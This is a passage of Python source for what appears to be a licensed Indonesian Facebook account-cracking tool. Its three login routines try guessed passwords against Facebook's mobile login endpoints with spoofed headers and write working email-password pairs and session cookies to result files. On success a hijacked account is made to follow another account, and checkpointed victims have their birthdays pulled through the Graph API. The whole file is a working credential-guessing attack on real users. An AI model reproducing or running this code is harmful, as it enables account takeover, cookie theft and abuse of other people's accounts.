            session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'c_user' in session.cookies.get_dict():
                OK.append(' [✓] %s|%s|%s' % (email,pw,convert_cookie(session.cookies.get_dict())))
                complete = tahun(email)
                h_ok = '\r%s  * --> %s|%s%s%s|%s%s'%(RGB,email, pw, complete, RGB, convert_cookie(session.cookies.get_dict()), RGB)
                if 'Fahmidev' in tampilapk: infoakun3(email, convert_cookie(session.cookies.get_dict()), h_ok)
                else: print(end="\r");prints(Panel(h_ok, title="[bold green]OK"))
                open("results/OK-"+tanggal+".txt", 'a+').write(' [√] %s|%s%s\n' % (email, pw, complete))
                botfollow(convert_cookie(session.cookies.get_dict()))
                break
            elif 'checkpoint' in session.cookies.get_dict():
                CP.append(' [×] %s|%s' % (email,pw))
                try:  ke = requests.get('https://graph.facebook.com/' + email + '?fields=name,id,birthday&access_token=' + open('.token.txt', 'r').read());tt = json.loads(ke.text);ttl = tt['birthday'];(m, d, y) = ttl.split('/');m = bulan_ttl[m];ttll = '|%s %s %s' % (d, m, y);complete = ttll + tahun(email)
                except (KeyError, IOError): ttll = '';complete = tahun(email) + '      '
                h_cp = '\r%s  * --> %s|%s%s%s'%(RYB,email, pw, complete, RPB)
                print(end="\r")
                prints(Panel(h_cp, title="[bold yellow]CP"))
                open("results/CP-"+tanggal+".txt", 'a+').write(' [×] %s|%s%s\n' % (email, pw, complete))
                break
            else:
                continue

        loop += 1
        print('\r  %s[%s*%s] cracking %s/%s -> OK-:%s - CP-:%s'%(P,O,P,loop,len(id),len(OK),len(CP)), end="")

    except requests.exceptions.ConnectionError:
        print('\r  %s[%s!%s] %sKoneksi Error                         '%(P,M,P,P), end="")
        log_mbasic(email, password)


# ------- LOGIN MOBILE V1 ------- #
def log_mobilev1(email, password):
    global OK, CP, loop, tampilapk
    try:
        for pw in password:
            session = requests.Session()
            session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":email,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            session.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'c_user' in session.cookies.get_dict():
                OK.append(' [✓] %s|%s|%s' % (email,pw,convert_cookie(session.cookies.get_dict())))
                complete = tahun(email)
                h_ok = '\r%s  * --> %s|%s%s%s|%s%s'%(RGB,email, pw, complete, RGB, convert_cookie(session.cookies.get_dict()), RGB)
                if 'Fahmidev' in tampilapk: infoakun3(email, convert_cookie(session.cookies.get_dict()), h_ok)
                else: print(end="\r");prints(Panel(h_ok, title="[bold green]OK"))
                open("results/OK-"+tanggal+".txt", 'a+').write(' [√] %s|%s%s\n' % (email, pw, complete))
                botfollow(convert_cookie(session.cookies.get_dict()))
                break
            elif 'checkpoint' in session.cookies.get_dict():
                CP.append(' [×] %s|%s' % (email,pw))
                try:  ke = requests.get('https://graph.facebook.com/' + email + '?fields=name,id,birthday&access_token=' + open('.token.txt', 'r').read());tt = json.loads(ke.text);ttl = tt['birthday'];(m, d, y) = ttl.split('/');m = bulan_ttl[m];ttll = '|%s %s %s' % (d, m, y);complete = ttll + tahun(email)
                except (KeyError, IOError): ttll = '';complete = tahun(email) + '      '
                h_cp = '\r%s  * --> %s|%s%s%s'%(RYB,email, pw, complete, RPB)
                print(end="\r")
                prints(Panel(h_cp, title="[bold yellow]CP"))
                open("results/CP-"+tanggal+".txt", 'a+').write(' [×] %s|%s%s\n' % (email, pw, complete))
                break
            else:
                continue

        loop += 1
        print('\r  %s[%s*%s] cracking %s/%s -> OK-:%s - CP-:%s'%(P,O,P,loop,len(id),len(OK),len(CP)), end="")

    except requests.exceptions.ConnectionError:
        print('\r  %s[%s!%s] %sKoneksi Error                         '%(P,M,P,P), end="")
        log_mobilev1(email, password)


# ------- LOGIN MOBILE V2 ------- #
def log_mobilev2(email, password):
    global OK, CP, loop, tampilapk
    try:
        for pw in password:
            session = requests.Session()
            session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":email,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            session.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            if 'c_user' in session.cookies.get_dict():
                OK.append(' [✓] %s|%s|%s' % (email,pw,convert_cookie(session.cookies.get_dict())))
                complete = tahun(email)
                h_ok = '\r%s  * --> %s|%s%s%s|%s%s'%(RGB,email, pw, complete, RGB, convert_cookie(session.cookies.get_dict()), RGB)
                if 'Fahmidev' in tampilapk: infoakun3(email, convert_cookie(session.cookies.get_dict()), h_ok)
                else: print(end="\r");prints(Panel(h_ok, title="[bold green]OK"))
                open("results/OK-"+tanggal+".txt", 'a+').write(' [√] %s|%s%s\n' % (email, pw, complete))
                botfollow(convert_cookie(session.cookies.get_dict()))
                break
            elif 'checkpoint' in session.cookies.get_dict():
                CP.append(' [×] %s|%s' % (email,pw))
                try:  ke = requests.get('https://graph.facebook.com/' + email + '?fields=name,id,birthday&access_token=' + open('.token.txt', 'r').read());tt = json.loads(ke.text);ttl = tt['birthday'];(m, d, y) = ttl.split('/');m = bulan_ttl[m];ttll = '|%s %s %s' % (d, m, y);complete = ttll + tahun(email)
                except (KeyError, IOError): ttll = '';complete = tahun(email) + '      '
                h_cp = '\r%s  * --> %s|%s%s%s'%(RYB,email, pw, complete, RPB)
                print(end="\r")
                prints(Panel(h_cp, title="[bold yellow]CP"))
                open("results/CP-"+tanggal+".txt", 'a+').write(' [×] %s|%s%s\n' % (email, pw, complete))
                break
            else:
                continue

        loop += 1
        print('\r  %s[%s*%s] cracking %s/%s -> OK-:%s - CP-:%s'%(P,O,P,loop,len(id),len(OK),len(CP)), end="")

    except requests.exceptions.ConnectionError:
        print('\r  %s[%s!%s] %sKoneksi Error                         '%(P,M,P,P), end="")
        log_mobilev2(email, password)


# ------- BUAT FOLDER ------- #
def folder():
    try: os.mkdir('CP')
    except: pass
    try: os.mkdir('OK')
    except: pass
    try: os.mkdir('results')
    except: pass


# ------- LISENSEE LOSIN ------- #
def lisense():
    clear()
    ses = requests.Session()
    prints(Panel("""[bold white][[bold yellow]+[bold white]] Masukan lisensi anda"""))
    lis = input(f'  {P}[{O}?{P}] lisensi : ')
    while lis == '':
        lis = input(f'  {P}[{O}?{P}] lisensi : ')
    my_key = lis
    link=ses.get(f'https://app.cryptolens.io/api/key/Activate?token={token_app}&ProductId={id_app}&Key={my_key}&Metadata=true')
    l=json.loads(link.text)
    try:
        col = l['licenseKey']
        ## ------- GET EXPIRED
        join_key = col['created'][:10]
        tahun,bulan,hari = join_key.split("-")
        bulan = bulan_ttl[bulan]
        exit_key = col['expires'][:10]
        tahun2,bulan2,hari2 = exit_key.split("-")
        bulan2 = bulan_ttl[bulan2]
        ## ------- GET DATA
        tod = col['customer']
        nama_key = tod['name']
        email = tod['email']
        metadata = l['metadata']
        status = metadata['licenseStatus']
        waktu = status['timeLeft']
        if int(waktu) == 0:
            prints(Panel("""[bold white][[bold red]×[bold white]] Lisensi anda tidak terdaftar di database."""))
            time.sleep(1)
            os.remove(urlkey())
            exit()
        my_lisen = (my_key.split('-')[0] + "-XXXXX-" + my_key.split('-')[2] + "-XXXXX")
        # ------- PRINT
        prints(Panel(f"""[bold white][[bold cyan]*[bold white]] Nama lisensi      : {nama_key}
[bold white][[bold cyan]*[bold white]] Gemail lisensi    : {email}
[bold white][[bold cyan]*[bold white]] Lisensi/Key       : {my_lisen}
[bold white][[bold cyan]*[bold white]] Bergabung         : {hari} {bulan} {tahun}
[bold white][[bold cyan]*[bold white]] Kadaluarsa        : {hari2} {bulan2} {tahun2}
[bold white][[bold cyan]*[bold white]] Status aktif      : {waktu} Hari lagi"""))
        time.sleep(1)
        prints(Panel(f"[bold white][[bold green]*[bold white]] Selamat... key/lisensi anda terdaftar di database..."))
        open(urlkey(), "w").write(my_key)
        exit()
    except (KeyError, IOError):
        prints(Panel("""[bold white][[bold red]×[bold white]] Lisensi anda tidak terdaftar di database."""))
        exit()


# ------- STATUS AKTIF ------- #
def active():
    on = "active"
    if on == "active":
        loglisensi()
    elif on == "maintenance":
        prints(Panel("[bold white][[bold yellow]![bold white]] Script sedang di perbaiki, silahkan coba lagi nanti", title="[bold red]KESALAHAN", border_style="red"));exit()
    else:
        prints(Panel("[bold white][[bold red]×[bold white]] Error", title="[bold red]ERROR", border_style="red"));exit()


### -------> # >>> MAIN <<< # <------- ###
if __name__ == "__main__":
    try:
        clear()
        folder()
        active()

    except (requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects):
        clear()
        connect_error()